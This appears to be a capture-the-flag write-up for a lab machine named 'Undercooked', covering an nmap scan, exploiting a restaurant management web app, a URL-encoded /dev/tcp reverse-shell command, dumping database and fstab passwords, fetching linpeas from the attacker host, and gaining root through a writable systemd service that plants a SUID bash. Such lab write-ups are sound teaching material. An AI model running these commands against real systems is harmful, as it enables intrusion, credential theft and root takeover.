# Undercooked

## Enumeration
```bash
└─$ sudo nmap -sS -A -p- 10.10.21.81
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 23:05 BST
Nmap scan report for 10.10.21.81
Host is up (0.031s latency).
Not shown: 65358 filtered tcp ports (no-response), 175 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 3.X (88%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 3.13 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   31.48 ms 10.8.0.1
2   31.74 ms 10.10.21.81
```

### Gobuster gives me this path : /kitchen
```bash
searchsploit RMS

sudo python 47520.py <IP>:<PORT>/kitchen
```
## Exploitation
### I did a reverse shell but url encoded
```sh -i >& /dev/tcp/10.8.37.214/4447 0>&1 = sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.37.214%2F4447%200%3E%261```

### I got a reverse shell

### I upgrade it
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

sh-4.2$ cat config.php
cat config.php
<?php
    define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_DATABASE', 'dbkitchen');
    define('APP_NAME', 'Onion Kingdom');
    error_reporting(1);
?>
```
## Privilege Escalation
### I download linpeas on the target machin
```bash
curl -0 http://10.8.37.214/linpeas.sh > linpeas.sh

./linpeas

/etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=kevin,password=ThisIsAnImpossibleToFindPassword,domain=localdomain,soft	0 0
```
### I went on the onion ssh session

```bash
ssh onion@<IP>
```

## User FLAG

```cat user.txt``` : EPI{Ph0r_S0Up_CU7_0N10ns_7h47s_17}

### I have write privileges over /etc/systemd/system/kitchen.service
```
sudo /usr/sbin/reboot

./bash -p (execute with suid permission)

[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /home/onion/bash; chmod +xs /home/onion/bash'

[Install]
WantedBy=multi-user.target
```

## Root FLAG
I forgot to write it :(
